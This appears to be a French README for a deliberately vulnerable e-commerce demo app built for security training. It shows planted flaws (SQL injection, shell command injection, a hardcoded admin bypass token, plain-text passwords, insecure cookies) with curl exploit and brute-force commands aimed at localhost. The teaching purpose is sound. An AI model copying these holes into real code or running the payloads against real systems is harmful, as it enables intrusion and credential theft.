# 👟 Sneaker Shop - Intentionally Vulnerable Application

**Un vrai projet e-commerce avec interface UI, inscriptions, logins... et 9 failles de sécurité très réalistes intégrées naturellement.**

## 🚀 Démarrage Rapide

```bash
npm install
npm start
```

Accédez à http://localhost:3000

### Comptes de Test

| Email | Password | Role |
|-------|----------|------|
| user@sneakers.com | user123 | User |
| admin@sneakers.com | admin | Admin |

---

## 🎯 Les 9 Failles de Sécurité

### 0️⃣ **SQL Injection (Vraie simulation)**

**Endpoint:** `GET /api/orders/search?userId=<input>`

**Problème:**
```javascript
// L'input utilisateur est concaténé directement dans la requête SQL
const sqlQuery = `SELECT * FROM orders WHERE userId = ${userId}`;
db.query(sqlQuery);  // FAILLE: jamais faire ça!
```

**Exploitation normale:**
```bash
# Login d'abord
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# Requête normale - voir ses propres commandes
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1"
```

**Exploitation SQL injection:**
```bash
# Injection: ' OR '1'='1  → retourne TOUTES les commandes!
curl -b cookies.txt "http://localhost:3000/api/orders/search?userId=1%20OR%20'1'%3D'1'"

# Résultat: toutes les commandes de tous les users (bypass du filtre userId)
# La réponse inclut même la requête SQL construite (autre faille!)
```

**Impact:** Accès non autorisé à toutes les données, lecture complète de la base

---

### 1️⃣ **No Input Validation**

**Endpoint:** `POST /api/register`

**Problème:**
```javascript
// Pas de validation des inputs
const { username, email, password } = req.body;
// En prod avec une DB: vulnérable à SQL injection
```

**Exploitation:**
```bash
# Register avec email malveillant
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "email":"admin@sneakers.com",
    "password":"hacked"
  }'
```

**Impact:** Créer des comptes avec des emails existants, bypass de validation

---

### 2️⃣ **Plain Text Passwords**

**Où:** Dans la base de données en mémoire

**Code Vulnérable:**
```javascript
const newUser = {
  username,
  email,
  password  // FAILLE: Pas de hash! Plain text!
};
users.push(newUser);
```

**Vérification:**
```bash
# Login avec l'admin
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"admin"}'

# Voir la réponse
# SUCCESS! Le password est stocké en clair
```

**Impact:** Si la BD est compromise, tous les passwords sont visibles

---

### 3️⃣ **No Rate Limiting on Login**

**Endpoint:** `POST /api/login`

**Problème:**
```javascript
app.post('/api/login', (req, res) => {
  // Pas de limite du nombre de tentatives
  // Pas de délai
  // Brute force possible en secondes
});
```

**Exploitation:**
```bash
# Script de brute force rapide
for i in {1..100}; do
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@sneakers.com\",\"password\":\"try$i\"}"
done

# Pas d'erreur 429, pas de throttling!
```

**Impact:** Brute force des passwords possible en peu de temps

---

### 4️⃣ **Admin Bypass Token**

**Où:** Header `X-Admin-Token`

**Code Vulnérable:**
```javascript
app.post('/api/login', (req, res) => {
  // FAILLE 4: Bypass admin!
  if (req.headers['x-admin-token'] === process.env.ADMIN_TOKEN) {
    req.session.userId = 1;
    req.session.username = 'admin_bypass';
    return res.json({ success: true, message: 'Admin access granted' });
  }
  // ...
});
```

**Exploitation:**
```bash
# Voir le token dans .env
cat .env | grep ADMIN_TOKEN
# ADMIN_TOKEN=admin_token_12345

# Utiliser pour bypasss le login!
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -H "X-Admin-Token: admin_token_12345" \
  -d '{"email":"anyone@example.com","password":"anything"}'

# SUCCESS! Accès admin sans bon password!
```

**Impact:** Escalade de privilèges directe vers admin

---

### 5️⃣ **Unsafe Session Cookies**

**Endpoint:** Session configuration

**Code Vulnérable:**
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: { 
    secure: false,      // FAILLE 5a: Pas de HTTPS
    httpOnly: false     // FAILLE 5b: Accessible du JavaScript!
  }
}));
```

**Exploitation:**
```javascript
// Dans la console du browser:
document.cookie
// Montre le session ID en clair!

// Attacker peut le voler et réutiliser
```

**Impact:** Session hijacking possible

---

### 6️⃣ **Information Disclosure - Error Messages**

**Endpoint:** `POST /api/login`

**Code Vulnérable:**
```javascript
const user = users.find(u => u.email === email && u.password === password);

if (!user) {
  const userExists = users.find(u => u.email === email);
  return res.json({ 
    success: false, 
    error: userExists ? 'Wrong password' : 'User not found'  // FAILLE 6!
  });
}
```

**Exploitation:**
```bash
# Tester un email qui existe
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}'
# Retourne: "Wrong password" → User exists!

# Tester un email qui n'existe pas
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}'
# Retourne: "User not found"
```

**Impact:** Énumération d'utilisateurs

---

### 7️⃣ **BFLA - Broken Function Level Access Control**

**Endpoint:** `GET /api/user/:id`

**Code Vulnérable:**
```javascript
app.get('/api/user/:id', isLoggedIn, (req, res) => {
  const userId = parseInt(req.params.id);
  
  // FAILLE 7: Pas de vérification!
  // N'importe quel utilisateur connecté peut voir le profil d'un autre
  
  const user = users.find(u => u.id === userId);
  res.json({ success: true, user: user });  // Expose TOUT, incluant password!
});
```

**Exploitation:**
```bash
# 1. Login comme user normal
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'
# Retourne: success=true

# 2. Accéder au profil d'un autre utilisateur
curl http://localhost:3000/api/user/2 \
  -H "Cookie: connect.sid=..."
# Retourne: le profil complet incluant password!

{
  "id": 2,
  "username": "admin",
  "email": "admin@sneakers.com",
  "password": "admin"  # HACKED!
}
```

**Impact:** Vol d'identité, récupération de passwords

---

### 8️⃣ **Command Injection**

**Endpoint:** `GET /api/shoes/search`

**Code Vulnérable:**
```javascript
app.get('/api/shoes/search', isLoggedIn, (req, res) => {
  const { q } = req.query;

  // FAILLE 8: Exécuter une commande avec input utilisateur
  const logCommand = `echo "Search: ${q}" >> /tmp/shoe_search.log`;
  
  exec(logCommand, { shell: true }, (err) => {
    if (err) console.error('Log error:', err.message);
  });
});
```

**Exploitation:**
```bash
# Recherche normale
curl "http://localhost:3000/api/shoes/search?q=Nike"

# Command injection
curl "http://localhost:3000/api/shoes/search?q=Nike; touch /tmp/pwned; echo"

# Vérifier si le fichier a été créé
ls -la /tmp/pwned
# FILE CREATED!
```

**Impact:** Exécution de code arbitraire sur le serveur

---

### 🔐 **Bonus Failles**

**Debug Mode Enabled:**
```bash
curl http://localhost:3000/api/config
# Retourne TOUS les secrets quand DEBUG=true
```

**Session Secret Hardcodé:**
```bash
cat .env | grep SESSION_SECRET
# Quelqu'un a "emprunté" le .env du repo GitHub
```

**Unsafe HTTPS (verify=false):**
```javascript
httpsAgent: {
  rejectUnauthorized: false  // MITM vulnerable!
}
```

---

## 📊 Résumé des Failles

| # | Faille | Type | Impact |
|---|--------|------|--------|
| 1 | No Validation | Injection | Bypass validation |
| 2 | Plain Text Passwords | Storage | Compromission si BD leak |
| 3 | No Rate Limiting | Brute Force | Accès par force brute |
| 4 | Admin Bypass Token | Authorization | Escalade de privilèges |
| 5 | Unsafe Cookies | Session | Session hijacking |
| 6 | Information Disclosure | Enumeration | Énumération d'users |
| 7 | BFLA | Access Control | Vol de données |
| 8 | Command Injection | RCE | Exécution de code |

---

## 🎬 Démo en Direct

### Scénario 1: Accès Admin
```bash
# Au lieu de logginer normalement
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'
# BOOM! Accès admin!
```

### Scénario 2: Voir les Passwords
```bash
# Login comme user normal
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# Accéder au profil de l'admin user
curl http://localhost:3000/api/user/2
# Voir: admin password en clair!
```

### Scénario 3: Brute Force
```bash
# Script simple
for password in $(cat wordlist.txt); do
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@sneakers.com\",\"password\":\"$password\"}"
done
# Pas de throttling = très rapide!
```

---

## 🛡️ Pourquoi C'est Réaliste

✅ **Vrai code d'e-commerce**
- Authentification complète
- Listing de produits
- Interface utilisateur

✅ **Erreurs communes**
- Pas de validation
- Password en clair
- Fièrement hardcodé en `.env`
- "Admin token temporaire" (laissé en prod)
- Pas de rate limiting ("on va le faire plus tard")

✅ **Les devs se Reconnaissent**
- "J'ai fait ça une fois..."
- "On a pas eu le temps..."
- "C'était temporaire..."

---

## 📚 Pour Aller Plus Loin

Voir `FIXES.md` pour comment corriger chacune des failles.

---

## ⚖️ Disclaimer

**Cette application est INTENTIONNELLEMENT VULNÉRABLE pour fins ÉDUCATIVES UNIQUEMENT.**

- ❌ NE PAS déployer en production
- ❌ NE PAS utiliser comme base pour vrai projet
- ✅ Pour démonstration de sécurité
- ✅ Pour formation des développeurs

---

**Créé pour: Live Security Presentation - Real World Vulnerabilities**

Enjoy! 🎉
